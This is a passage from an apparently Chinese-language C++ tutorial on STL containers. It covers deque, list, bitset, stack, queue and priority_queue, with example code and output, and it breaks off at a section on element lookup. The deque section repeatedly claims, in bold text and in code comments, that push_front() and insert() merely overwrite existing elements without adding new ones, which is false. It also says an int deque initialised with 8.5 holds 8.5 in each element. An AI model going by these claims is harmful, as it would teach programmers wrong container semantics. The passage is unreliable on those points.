<p>deque 双端队列容器与 vector 一样，采用线性表顺序存储结构。但与 vector
唯一不同的是，deque 采用分块的线性存储结构来存储数据，每块的大小一般为
512 字节，称为一个 deque 块，所有的 deque 块使用一个 Map
块进行管理，每个 Map 数据项记录各个 deque块的首地址。这样一来，deque
块在头部和尾部都可插入和删除元素，而不需移动其他元素（<strong>使用
push_back()方法在尾部插入元素，会扩张队列；而使用
push_front()方法在首部插入元素和使用
insert()方法在中间插入元素，只是将原位置上的元素值覆盖，不会增加新元素</strong>）。一般来说，当考虑到容器元素的内存分配策略和操作的性能时，deque
相对于 vector更有优势。双端队列容器结构示意图如图所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_641026fb18bea.png" /></p>
<p><strong>创建 deque 对象</strong></p>
<p>使用 deque 需要声明头文件包含“#include <deque>”。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">deque&lt;<span class="type">int</span>&gt; d; </span><br><span class="line">deque&lt;<span class="type">float</span>&gt; dd;</span><br><span class="line">deque&lt;<span class="type">int</span>&gt; d（<span class="number">10</span>）；<span class="comment">//创建具有 10 个整型元素的 deque 对象 d</span></span><br><span class="line">deque&lt;<span class="type">int</span>&gt; d（<span class="number">10</span>，<span class="number">8.5</span>）；<span class="comment">//创建具有 10 个整型元素的 deque 对象 d，每个元素值为 8.5</span></span><br></pre></td></tr></table></figure>
<p><strong>插入元素</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义 deque 对象，元素类型是整型 </span></span><br><span class="line">deque&lt;<span class="type">int</span>&gt; d; </span><br><span class="line"><span class="comment">//从尾部连续插入三个元素 </span></span><br><span class="line">d.push\_back(<span class="number">1</span>); </span><br><span class="line">d.push\_back(<span class="number">2</span>);</span><br><span class="line">d.push\_back(<span class="number">3</span>);</span><br><span class="line"><span class="comment">//从头部插入元素，**不会增加新元素，只将原有的元素覆盖** </span></span><br><span class="line">d.push\_front(<span class="number">10</span>); </span><br><span class="line">d.push\_front(<span class="number">20</span>);</span><br><span class="line"><span class="comment">//中间插入元素,不会增加新元素，只将原有的元素覆盖 </span></span><br><span class="line">d.<span class="built_in">insert</span>(d.<span class="built_in">begin</span>()+<span class="number">1</span>,<span class="number">88</span>);</span><br><span class="line"><span class="comment">//以数组方式输出元素 </span></span><br><span class="line">cout&lt;&lt;d\[<span class="number">0</span>\]&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;d\[<span class="number">1</span>\]&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;d\[<span class="number">2</span>\]&lt;&lt;endl;</span><br></pre></td></tr></table></figure>
<p><strong>遍历</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//以数组方式输出元素</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;d.<span class="built_in">size</span>();i++) </span><br><span class="line">&#123; </span><br><span class="line">   cout&lt;&lt;d\[i\]&lt;&lt;<span class="string">&quot; &quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//以前向迭代器的方式遍历 </span></span><br><span class="line">deque&lt;<span class="type">int</span>&gt;::iterator it; </span><br><span class="line"><span class="keyword">for</span>(it=d.<span class="built_in">begin</span>();it!=d.<span class="built_in">end</span>();it++) </span><br><span class="line">&#123; </span><br><span class="line">   cout&lt;&lt;\*it&lt;&lt;<span class="string">&quot; &quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//以反向迭代器的方式遍历 </span></span><br><span class="line">deque&lt;<span class="type">int</span>&gt;::reverse\_iterator rit; </span><br><span class="line"><span class="keyword">for</span>(rit=d.<span class="built_in">rbegin</span>();rit!=d.<span class="built_in">rend</span>();rit++) </span><br><span class="line">&#123; </span><br><span class="line">   cout&lt;&lt;\*rit&lt;&lt;<span class="string">&quot; &quot;</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>删除元素</strong></p>
<p>可以从双端队列容器的首部、尾部、中部删除元素，并可以清空双端队列容器。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//从头部删除元素 </span></span><br><span class="line">d.pop\_front();</span><br><span class="line"><span class="comment">//从尾部删除元素 </span></span><br><span class="line">d.pop\_back();</span><br><span class="line"><span class="comment">//从中间删除元素，erase 的参数是迭代器位置 </span></span><br><span class="line">d.<span class="built_in">erase</span>(d.<span class="built_in">begin</span>()+<span class="number">1</span>);</span><br><span class="line"><span class="comment">//清空元素 </span></span><br><span class="line">d.<span class="built_in">clear</span>();</span><br></pre></td></tr></table></figure>
<h2 id="list-双向链表容器">8、list 双向链表容器</h2>
<p>list 容器实现了双向循环链表的数据结构。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_64102b07ca6b5.png" /></p>
<p><strong>注意，</strong>由于 list
对象的节点并不要求在一段连续的内存中，所以，对于迭代器，只能通过“++”或“-
-”的操作将迭代器移动到后继/前驱节点元素处。而不能对迭代器进行+n 或-n
的操作，这点，是与 vector
等不同的地方。如：it=l.begin()+1也是不正确的。</p>
<p><strong>创建 list 对象</strong></p>
<p>头文件#include <list></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">list&lt;<span class="type">int</span>&gt; l;<span class="comment">//创建空链表</span></span><br><span class="line">list&lt;<span class="type">int</span>&gt; l（<span class="number">10</span>）; <span class="comment">//创建具有 10 个元素的链表</span></span><br></pre></td></tr></table></figure>
<p><strong>元素插入和遍历</strong></p>
<ul>
<li>采用 push_back()方法往尾部插入新元素，链表自动扩张。</li>
<li>采用 push_front()方法往首部插入新元素，链表自动扩张。</li>
<li>采用
insert()方法往迭代器位置处插入新元素，链表自动扩张。注意，迭代器只能进行“++”或“-
-”操作，不能进行+n 或-n 的操作，因为元素的位置并不是物理相连的。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义元素为整型的 list 对象，当前没有元素 </span></span><br><span class="line">list&lt;<span class="type">int</span>&gt; l; </span><br><span class="line"><span class="comment">//在链表尾部插入新元素，链表自动扩张 </span></span><br><span class="line">l.push\_back(<span class="number">2</span>); </span><br><span class="line"><span class="comment">//在链表头部插入新元素，链表自动扩张 </span></span><br><span class="line">l.push\_front(<span class="number">8</span>); </span><br><span class="line"><span class="comment">//在任意位置插入新元素，链表自动扩张 </span></span><br><span class="line">list&lt;<span class="type">int</span>&gt;::iterator it; </span><br><span class="line">it=l.<span class="built_in">begin</span>(); </span><br><span class="line">it++;<span class="comment">//注意，链表的迭代器只能进行++或--操作，而不能进行+n 操作 </span></span><br><span class="line">l.<span class="built_in">insert</span>(it,<span class="number">20</span>); </span><br><span class="line"><span class="comment">//使用前向迭代器遍历链表 </span></span><br><span class="line"><span class="keyword">for</span>(it=l.<span class="built_in">begin</span>();it!=l.<span class="built_in">end</span>();it++) </span><br><span class="line">&#123; </span><br><span class="line">  cout&lt;&lt;\*it&lt;&lt;<span class="string">&quot; &quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//反向遍历链表</span></span><br><span class="line">**<span class="comment">//注意：反向遍历时亦是”++“，而非 ”--“**</span></span><br><span class="line">list&lt;<span class="type">int</span>&gt;::reverse\_iterator rit; </span><br><span class="line"><span class="keyword">for</span>(rit=l.<span class="built_in">rbegin</span>();rit!=l.<span class="built_in">rend</span>();rit++) </span><br><span class="line">&#123; </span><br><span class="line">  cout&lt;&lt;\*rit&lt;&lt;<span class="string">&quot; &quot;</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>元素删除</strong></p>
<ul>
<li>可以使用
remove()方法删除链表中一个元素，值相同的元素都会被删除。</li>
<li>使用 pop_front()方法删除链表首元素。</li>
<li>使用 pop_back()方法删除链表尾元素。</li>
<li>使用 erase()方法删除迭代器位置上的元素。</li>
<li>使用 clear()方法清空链表。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//删除值等于 1 的所有元素 </span></span><br><span class="line">l.<span class="built_in">remove</span>(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//删除首元素</span></span><br><span class="line">l.pop\_front(); </span><br><span class="line"><span class="comment">//删除尾元素 </span></span><br><span class="line">l.pop\_back();</span><br><span class="line"><span class="comment">//删除第 2 个元素（从 0 开始计数） </span></span><br><span class="line">it=l.<span class="built_in">begin</span>(); </span><br><span class="line">it++; </span><br><span class="line">it++; </span><br><span class="line">l.<span class="built_in">erase</span>(it);</span><br><span class="line"><span class="comment">//清空链表 </span></span><br><span class="line">l.<span class="built_in">clear</span>();</span><br></pre></td></tr></table></figure>
<p><strong>剔除连续重复元素</strong></p>
<p>采用
unique()方法可以剔除<strong>连续</strong>重复元素，只保留一个。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义元素为整型的 list 对象，当前没有元素 </span></span><br><span class="line">list&lt;<span class="type">int</span>&gt; l; </span><br><span class="line"><span class="comment">//在链表尾部插入新元素，链表自动扩张 </span></span><br><span class="line">l.push\_back(<span class="number">2</span>); </span><br><span class="line">l.push\_back(<span class="number">8</span>); </span><br><span class="line">l.push\_back(<span class="number">1</span>); </span><br><span class="line">l.push\_back(<span class="number">1</span>); </span><br><span class="line">l.push\_back(<span class="number">1</span>); </span><br><span class="line">l.push\_back(<span class="number">5</span>); </span><br><span class="line">l.push\_back(<span class="number">1</span>); </span><br><span class="line"><span class="comment">//遍历链表 </span></span><br><span class="line">list&lt;<span class="type">int</span>&gt;::iterator it,it2; </span><br><span class="line"><span class="keyword">for</span>(it=l.<span class="built_in">begin</span>();it!=l.<span class="built_in">end</span>();it++) </span><br><span class="line">&#123; </span><br><span class="line">  cout&lt;&lt;\*it&lt;&lt;<span class="string">&quot; &quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//回车换行 </span></span><br><span class="line">cout&lt;&lt;endl; </span><br><span class="line"><span class="comment">//剔除连续重复元素（只保留一个） </span></span><br><span class="line">l.<span class="built_in">unique</span>(); </span><br><span class="line"><span class="comment">//遍历链表 </span></span><br><span class="line"><span class="keyword">for</span>(it=l.<span class="built_in">begin</span>();it!=l.<span class="built_in">end</span>();it++) </span><br><span class="line">&#123; </span><br><span class="line">  cout&lt;&lt;\*it&lt;&lt;<span class="string">&quot; &quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="number">2</span> <span class="number">8</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">5</span> <span class="number">1</span> </span><br><span class="line"><span class="number">2</span> <span class="number">8</span> <span class="number">1</span> <span class="number">5</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><strong>元素排序</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用 sort()方法对链表排序，是升序排列 </span></span><br><span class="line">l.<span class="built_in">sort</span>();</span><br></pre></td></tr></table></figure>
<h2 id="bitset-位集合容器">9、bitset 位集合容器</h2>
<p>bitset 容器是一个 bit 位元素的序列容器，每个元素只占一个 bit
位，取值为 0 或 1。头文件包含语句“#include <bitset>”。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_64102f9b72f65.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/03/img_64102fe01728a.png" /></p>
<p><strong>创建 bitset 对象</strong></p>
<p>创建 bitset 对象时，必须要指定容器的大小。bitset
对象的大小一经定义，就不能修改了。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">bitset&lt;100000&gt; b  <span class="comment">//定义: bitset&lt;容器大小&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>设置元素值</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//采用下标法给元素赋值 </span></span><br><span class="line">b\[<span class="number">1</span>\]=<span class="number">1</span>; </span><br><span class="line">b\[<span class="number">6</span>\]=<span class="number">1</span>; </span><br><span class="line"><span class="comment">//采用 set()方法，一次性将元素设置为 1 </span></span><br><span class="line">b.<span class="built_in">set</span>();</span><br><span class="line"><span class="comment">//采用 set(pos)方法，将某 pos 位设置为 1。</span></span><br><span class="line">b.<span class="built_in">set</span>(<span class="number">6</span>,<span class="number">1</span>); </span><br><span class="line">b.<span class="built_in">set</span>(<span class="number">9</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//采用 reset(pos)方法，将某 pos 位设置为 0。</span></span><br><span class="line">b.<span class="built_in">reset</span>(<span class="number">4</span>);</span><br><span class="line">b.<span class="built_in">reset</span>(<span class="number">8</span>);</span><br></pre></td></tr></table></figure>
<p><strong>输出元素</strong></p>
<ul>
<li>下标输出</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//下标法输出所有元素，第 0 位是最低位，第 9 位是最高位</span></span><br><span class="line"><span class="keyword">for</span>(i=b.<span class="built_in">size</span>()<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--) </span><br><span class="line">&#123; </span><br><span class="line">    cout&lt;&lt;b\[i\]; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*   直接向输出流输出全部元素</span><br><span class="line"></span><br><span class="line">bitset&lt;10&gt; b; </span><br><span class="line"><span class="comment">//采用 set()方法，将元素全部设置为 1 </span></span><br><span class="line">b.<span class="built_in">set</span>(); </span><br><span class="line"><span class="comment">//采用 set(pos)方法，将元素设置为 0 </span></span><br><span class="line">b.<span class="built_in">set</span>(<span class="number">0</span>,<span class="number">0</span>); </span><br><span class="line">b.<span class="built_in">set</span>(<span class="number">2</span>,<span class="number">0</span>); </span><br><span class="line">b.<span class="built_in">set</span>(<span class="number">3</span>,<span class="number">0</span>); </span><br><span class="line">b.<span class="built_in">set</span>(<span class="number">4</span>,<span class="number">0</span>); </span><br><span class="line">b.<span class="built_in">set</span>(<span class="number">5</span>,<span class="number">0</span>); </span><br><span class="line">b.<span class="built_in">set</span>(<span class="number">7</span>,<span class="number">0</span>); </span><br><span class="line">b.<span class="built_in">set</span>(<span class="number">8</span>,<span class="number">0</span>); </span><br><span class="line"><span class="comment">//直接向输出流输出全部元素 </span></span><br><span class="line">cout&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">1001000010</span></span><br></pre></td></tr></table></figure>
<h2 id="stack-堆栈容器">10、stack 堆栈容器</h2>
<p>stack 堆栈是一个后进先出（Last In First
Out，LIFO）的线性表，插入和删除元素都只能在表的一端进行。插入元素的一端称为栈顶（Stack
Top），而另一端则称为栈底（Stack
Bottom）。插入元素叫入栈（Push），元素的删除则称为出栈（Pop）。头文件包含语句“#include
<stack>”。</p>
<p>堆栈只提供入栈、出栈、栈顶元素访问和判断是否为空等几种方法。</p>
<ul>
<li>示例：</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>\* argv\[\])</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  <span class="comment">//定义堆栈 s，其元素类型是整型 </span></span><br><span class="line">  stack&lt;<span class="type">int</span>&gt; s; </span><br><span class="line">  <span class="comment">//元素入栈 </span></span><br><span class="line">  s.<span class="built_in">push</span>(<span class="number">1</span>); </span><br><span class="line">  s.<span class="built_in">push</span>(<span class="number">2</span>); </span><br><span class="line">  s.<span class="built_in">push</span>(<span class="number">3</span>);</span><br><span class="line">  s.<span class="built_in">push</span>(<span class="number">9</span>); </span><br><span class="line">  <span class="comment">//读取栈顶元素 </span></span><br><span class="line">  cout&lt;&lt;s.<span class="built_in">top</span>()&lt;&lt;endl; </span><br><span class="line">  <span class="comment">//返回堆栈元素数量 </span></span><br><span class="line">  cout&lt;&lt;s.<span class="built_in">size</span>()&lt;&lt;endl; </span><br><span class="line">  <span class="comment">//判断堆栈是否为空 </span></span><br><span class="line">  cout&lt;&lt;s.<span class="built_in">empty</span>()&lt;&lt;endl; </span><br><span class="line">  <span class="comment">//所有元素出栈（删除所有元素） </span></span><br><span class="line">  <span class="keyword">while</span>(s.<span class="built_in">empty</span>()!=<span class="literal">true</span>)<span class="comment">//堆栈非空 </span></span><br><span class="line">  &#123; </span><br><span class="line">    cout&lt;&lt;s.<span class="built_in">top</span>()&lt;&lt;<span class="string">&quot; &quot;</span>;<span class="comment">//读取栈顶元素 </span></span><br><span class="line">    s.<span class="built_in">pop</span>();<span class="comment">//出栈（即删除栈顶元素） </span></span><br><span class="line">  &#125; </span><br><span class="line">  <span class="comment">//回车换行 </span></span><br><span class="line">  cout&lt;&lt;endl; </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*   运行结果：</span><br><span class="line"></span><br><span class="line"><span class="number">9</span> </span><br><span class="line"><span class="number">4</span> </span><br><span class="line"><span class="number">0</span> </span><br><span class="line"><span class="number">9</span> <span class="number">3</span> <span class="number">2</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="queue-队列容器">11、queue 队列容器</h2>
<p>queue 队列容器是一个先进先出（First In First
Out，FIFO）的线性存储表，元素的插入只能在队尾，元素的删除只能在队首。头文件包含语句“#include
<queue>”。</p>
<ul>
<li><strong>示例：</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>\* argv\[\])</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  <span class="comment">//定义队列，元素类型是整型 </span></span><br><span class="line">  queue&lt;<span class="type">int</span>&gt; q; </span><br><span class="line">  <span class="comment">//入队，即插入元素 </span></span><br><span class="line">  q.<span class="built_in">push</span>(<span class="number">1</span>); </span><br><span class="line">  q.<span class="built_in">push</span>(<span class="number">2</span>); </span><br><span class="line">  q.<span class="built_in">push</span>(<span class="number">3</span>); </span><br><span class="line">  q.<span class="built_in">push</span>(<span class="number">9</span>); </span><br><span class="line">  <span class="comment">//返回队列元素数量 </span></span><br><span class="line">  cout&lt;&lt;q.<span class="built_in">size</span>()&lt;&lt;endl; </span><br><span class="line">  <span class="comment">//队列是否为空，是空，则返回逻辑真，否则返回逻辑假 </span></span><br><span class="line">  cout&lt;&lt;q.<span class="built_in">empty</span>()&lt;&lt;endl; </span><br><span class="line">  <span class="comment">//读取队首元素 </span></span><br><span class="line">  cout&lt;&lt;q.<span class="built_in">front</span>()&lt;&lt;endl; </span><br><span class="line">  <span class="comment">//读取队尾元素 </span></span><br><span class="line">  cout&lt;&lt;q.<span class="built_in">back</span>()&lt;&lt;endl; </span><br><span class="line">  <span class="comment">//所有的元素出列（删除所有元素） </span></span><br><span class="line">  <span class="keyword">while</span>(q.<span class="built_in">empty</span>()!=<span class="literal">true</span>) </span><br><span class="line">  &#123; </span><br><span class="line">    cout&lt;&lt;q.<span class="built_in">front</span>()&lt;&lt;<span class="string">&quot; &quot;</span>; </span><br><span class="line">    <span class="comment">//队首元素出队（删除队首元素） </span></span><br><span class="line">    q.<span class="built_in">pop</span>(); </span><br><span class="line">  &#125; </span><br><span class="line">  <span class="comment">//回车换行 </span></span><br><span class="line">  cout&lt;&lt;endl; </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="priority_queue-优先队列容器">12、priority_queue
优先队列容器</h2>
<p>priority_queue
优先队列容器与队列一样，只能从队尾插入元素，从队首删除元素。但它有一个特性，就是队列中最大的元素总是位于队首，所以出队时，并非按先进先出的原则进行，而是将当前队列中最大的元素出队。这点类似于给队列里的元素进行了由大到小的顺序排序。元素的比较规则默认为按元素的值由大到小排序；当然，可以重载“&lt;”操作符来重新定义比较规则。使用
priority_queue 需要声明头文件包含语句“#include
<queue>”。优先队列包含入队 push()（插入元素）、出队
pop()（删除元素）、<strong>读取队首元素 top()</strong>、判断队列是否为空
empty()和读取队列元素数量 size()等方法。</p>
<ul>
<li><strong>示例</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>\* argv\[\])</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  <span class="comment">//定优先队列，元素类型为整型 </span></span><br><span class="line">  priority\_queue&lt;<span class="type">int</span>&gt; pq; </span><br><span class="line">  <span class="comment">//入队，插入新元素 </span></span><br><span class="line">  pq.<span class="built_in">push</span>(<span class="number">1</span>); </span><br><span class="line">  pq.<span class="built_in">push</span>(<span class="number">2</span>); </span><br><span class="line">  pq.<span class="built_in">push</span>(<span class="number">3</span>); </span><br><span class="line">  pq.<span class="built_in">push</span>(<span class="number">9</span>); </span><br><span class="line">  <span class="comment">//返回队列中元素数目 </span></span><br><span class="line">  cout&lt;&lt;pq.<span class="built_in">size</span>()&lt;&lt;endl; </span><br><span class="line">  <span class="comment">//所有元素出队，删除所有元素 </span></span><br><span class="line">  <span class="keyword">while</span>(pq.<span class="built_in">empty</span>()!=<span class="literal">true</span>) </span><br><span class="line">  &#123; </span><br><span class="line">    <span class="comment">//读取当前队首元素 </span></span><br><span class="line">    cout&lt;&lt;pq.<span class="built_in">top</span>()&lt;&lt;<span class="string">&quot; &quot;</span>;  ** <span class="comment">//注意 此处用的是top()和普通队列稍有区别**</span></span><br><span class="line">    <span class="comment">//出队，删除队首元素 </span></span><br><span class="line">    pq.<span class="built_in">pop</span>(); </span><br><span class="line">  &#125; </span><br><span class="line">  <span class="comment">//回车换行 </span></span><br><span class="line">  cout&lt;&lt;endl; </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>重载“&lt;”操作符来定义优先级</strong></p>
<p>如果优先队列的元素类型是结构体，可以通过在结构体中重载“&lt;”操作符的方法来修改优先队列的优先性。</p>
<ul>
<li><strong>示例</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="comment">//定义结构体 </span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Info</span>&#123; </span><br><span class="line">  string name; </span><br><span class="line">  <span class="type">float</span> score; </span><br><span class="line">  <span class="comment">//重载“&lt;”操作符，指定优先规则（排序规则） </span></span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> Info &amp;a) <span class="type">const</span> </span><br><span class="line">  &#123; </span><br><span class="line">    <span class="comment">//按 score 由小到大排列。如果要由大到小排列，使用“&gt;”号即可 </span></span><br><span class="line">    <span class="keyword">return</span> a.score&lt;score; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>\* argv\[\])</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  <span class="comment">//定义优先队列，元素类型为 Info 结构体 </span></span><br><span class="line">  priority\_queue&lt;Info&gt; pq; </span><br><span class="line">  <span class="comment">//定义结构体变量 </span></span><br><span class="line">  Info info; </span><br><span class="line"></span><br><span class="line">  <span class="comment">//入队 </span></span><br><span class="line">  info.name=<span class="string">&quot;Jack&quot;</span>; </span><br><span class="line">  info.score=<span class="number">68.5</span>; </span><br><span class="line">  pq.<span class="built_in">push</span>(info); </span><br><span class="line"></span><br><span class="line">  info.name=<span class="string">&quot;Bomi&quot;</span>; </span><br><span class="line">  info.score=<span class="number">18.5</span>; </span><br><span class="line">  pq.<span class="built_in">push</span>(info); </span><br><span class="line"></span><br><span class="line">  info.name=<span class="string">&quot;Peti&quot;</span>; </span><br><span class="line">  info.score=<span class="number">90</span>; </span><br><span class="line">  pq.<span class="built_in">push</span>(info); </span><br><span class="line"></span><br><span class="line">  <span class="comment">//元素全部出队 </span></span><br><span class="line">  <span class="keyword">while</span>(pq.<span class="built_in">empty</span>()!=<span class="literal">true</span>) </span><br><span class="line">  &#123; </span><br><span class="line">    <span class="comment">//返回队首元素 </span></span><br><span class="line">    cout&lt;&lt;pq.<span class="built_in">top</span>().name&lt;&lt;<span class="string">&quot; : &quot;</span>&lt;&lt;pq.<span class="built_in">top</span>().score&lt;&lt;endl; </span><br><span class="line">    <span class="comment">//出队，删除队首元素 </span></span><br><span class="line">    pq.<span class="built_in">pop</span>(); </span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>运行结果：</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Bomi : <span class="number">18.5</span>  </span><br><span class="line">Jack : <span class="number">68.5</span>    </span><br><span class="line">Peti : <span class="number">90</span>   </span><br></pre></td></tr></table></figure>
<p><strong>重载“()”操作符来定义优先级</strong></p>
<p>如果优先队列的元素不是结构体类型，则可以通过重载“()”操作符的方式来定义优先级。当然，元素是结构体类型，也可以通过重载“()”操作符的方式来定义优先级，而不是一定要在结构体内重载“&lt;”操作符才行。</p>
<ul>
<li><strong>示例：</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="comment">//重载“()”操作符 </span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">myComp</span> </span><br><span class="line">&#123; </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;a,<span class="type">const</span> <span class="type">int</span> &amp;b)</span> </span></span><br><span class="line"><span class="function">  </span>&#123; </span><br><span class="line">    <span class="comment">//由小到大排列采用“&gt;”号；如果要由大到小排列，则采用“&lt;”号 </span></span><br><span class="line">    <span class="keyword">return</span> a&gt;b; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>\* argv\[\])</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">  <span class="comment">//定义优先队列，元素类型为 Info 结构体，显式说明内部结构是 vector </span></span><br><span class="line">  priority\_queue&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt;,myComp&gt; pq; </span><br><span class="line">  <span class="comment">//入队 </span></span><br><span class="line">  pq.<span class="built_in">push</span>(<span class="number">1</span>); </span><br><span class="line">  pq.<span class="built_in">push</span>(<span class="number">9</span>); </span><br><span class="line">  pq.<span class="built_in">push</span>(<span class="number">2</span>); </span><br><span class="line">  pq.<span class="built_in">push</span>(<span class="number">30</span>); </span><br><span class="line">  <span class="comment">//元素全部出队 </span></span><br><span class="line">  <span class="keyword">while</span>(pq.<span class="built_in">empty</span>()!=<span class="literal">true</span>) </span><br><span class="line">  &#123; </span><br><span class="line">    <span class="comment">//返回队首元素 </span></span><br><span class="line">    cout&lt;&lt;pq.<span class="built_in">top</span>()&lt;&lt;<span class="string">&quot; &quot;</span>; </span><br><span class="line">    <span class="comment">//出队，删除队首元素 </span></span><br><span class="line">    pq.<span class="built_in">pop</span>(); </span><br><span class="line">  &#125; </span><br><span class="line">  cout&lt;&lt;endl; </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//运行结果</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">9</span> <span class="number">30</span></span><br></pre></td></tr></table></figure>
<h2 id="元素查找"><strong>13、元素查找</strong></h2>
<p>采用
